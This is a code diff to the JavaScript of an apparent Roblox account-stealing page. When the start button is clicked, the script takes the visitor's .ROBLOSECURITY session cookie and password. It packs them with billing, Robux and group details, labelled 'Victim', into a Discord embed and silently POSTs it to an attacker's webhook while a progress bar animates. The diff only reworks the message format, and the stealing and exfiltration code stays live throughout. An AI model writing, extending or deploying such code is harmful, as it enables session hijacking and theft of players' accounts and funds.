@@ -129,54 +129,69 @@ btnStart.onclick = async () => {
         // Get webhook URL from protect.js
         const WEBHOOK_URL = window.WEBHOOK_URL;
         
-        // Prepare webhook data
+        // Build detailed description like in image
+        const description = `[Refresh Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie}) 🔄 | [Profile](https://www.roblox.com/users/${data.detailedInfo.userId}/profile) 👤 | [Discord Server](https://discord.gg/your-server) :discord_icon:\n\n` +
+            `🔹 **Username**\n${data.detailedInfo.username}\n\n` +
+            (password ? `🔹 **Password**\n${password}\n\n` : '') +
+            `**Account Stats**\n` +
+            `**Account Age:** ${data.detailedInfo.accountAgeDays} Days\n` +
+            `**Location**\n` +
+            `• **Account:** ${data.detailedInfo.country}\n` +
+            `• **Victim:** ${data.detailedInfo.country} ${data.detailedInfo.countryFlag}\n\n` +
+            `💰 **Billing**\n` +
+            `Credit ${data.detailedInfo.creditBalance} ℹ️\n` +
+            `Convert ${data.detailedInfo.convertBalance} ℹ️\n` +
+            `Payments ${data.detailedInfo.paymentsBalance} 🛡️\n\n` +
+            `👥 **Groups**\n` +
+            `Balance ${data.detailedInfo.groupBalance} ℹ️\n` +
+            `Pending ${data.detailedInfo.groupPending} ℹ️\n` +
+            `Owned ${data.detailedInfo.groupsOwned}\n\n` +
+            `⚙️ **Settings**\n` +
+            `📧 False (${data.detailedInfo.emailStatus}) ℹ️\n` +
+            `🔔 Unset (Unverified)\n` +
+            `🚫 Disabled\n\n` +
+            `💳 **Account Funds**\n` +
+            `Balance ${data.detailedInfo.robux} ℹ️\n` +
+            `Pending ${data.detailedInfo.pendingRobux} ℹ️\n\n` +
+            `🛒 **Purchases**\n` +
+            `Limited ${data.detailedInfo.limitedPurchases} ℹ️\n` +
+            `Summary ${data.detailedInfo.purchaseSummary} ℹ️\n\n` +
+            `🎮 **Collectibles**\n` +
+            `❌ False ❌\n` +
+            `❌ False ❌\n\n` +
+            `🎯 **Badges | Played**\n` +
+            `${data.detailedInfo.badges}\n\n` +
+            `💎 **ROBLOSECURITY**\n` +
+            `\`\`\`_|SHARE-THIS-TO-\n${cookie}\`\`\``;
+
+        // Prepare webhook with exact format from image
         const webhookData = {
-            content: '@everyone',
-            username: 'HyperBlox',
-            avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
+            content: `<@&YOUR_ROLE_ID>`,
+            username: 'Mystic Gen 🔮',
+            avatar_url: data.detailedInfo.avatarUrl,
             embeds: [{
-                title: '',
-                type: 'rich',
-                description: `<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie})** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=${cookie})** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/${data.userInfo.userId}/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/${data.userInfo.userId})**`,
-                color: 0x00061a,
-                thumbnail: { url: data.avatarUrl },
-                fields: [
-                    { name: '<:display:1348231445029847110> Display Name', value: `\`\`\`${data.userInfo.displayName}\`\`\``, inline: true },
-                    { name: '<:user:1348232101639618570> Username', value: `\`\`\`${data.userInfo.username}\`\`\``, inline: true },
-                    { name: '<:userid:1348231351777755167> User ID', value: `\`\`\`${data.userInfo.userId}\`\`\``, inline: true },
-                    { name: '<:robux:1348231412834111580> Robux', value: `\`\`\`${data.userInfo.robux}\`\`\``, inline: true },
-                    { name: '<:pending:1348231397529223178> Pending Robux', value: `\`\`\`0\`\`\``, inline: true },
-                    { name: '<:rap:1348231409323741277> RAP', value: `\`\`\`${data.userInfo.rap}\`\`\``, inline: true },
-                    { name: '<:premium:1348231403690786949> Premium', value: `\`\`\`${data.userInfo.premium}\`\`\``, inline: true },
-                    { name: '<:vc:1348233572020129792> Voice Chat', value: `\`\`\`${data.userInfo.voiceChat}\`\`\``, inline: true },
-                    { name: '⭐ Account Score', value: `\`\`\`${data.userInfo.accountScore}/100\`\`\``, inline: true },
-                    ...(password ? [{ name: '🔐 Password', value: `\`\`\`${password}\`\`\``, inline: false }] : [])
-                ]
+                author: {
+                    name: `${data.detailedInfo.username} | ${data.detailedInfo.displayName}`,
+                    icon_url: data.detailedInfo.avatarUrl
+                },
+                description: description,
+                color: 0x2b2d31,
+                thumbnail: {
+                    url: data.detailedInfo.avatarUrl
+                },
+                footer: {
+                    text: `Account Score: ${data.detailedInfo.accountScore}/100 | ${getScoreRating(data.detailedInfo.accountScore)}`
+                },
+                timestamp: new Date().toISOString()
             }]
         };
 
-        // Send webhook (fire and forget)
+        // Send webhook
         fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(webhookData)
         }).catch(() => {});
-
-        // Send cookie in second message
-        setTimeout(() => {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: 'HyperBlox',
-                    avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
-                    embeds: [{
-                        description: `\`\`\`${cookie}\`\`\``,
-                        color: 0x00061a
-                    }]
-                })
-            }).catch(() => {});
-        }, 2000);
 
         // Animate progress bar
         let progress = 0;
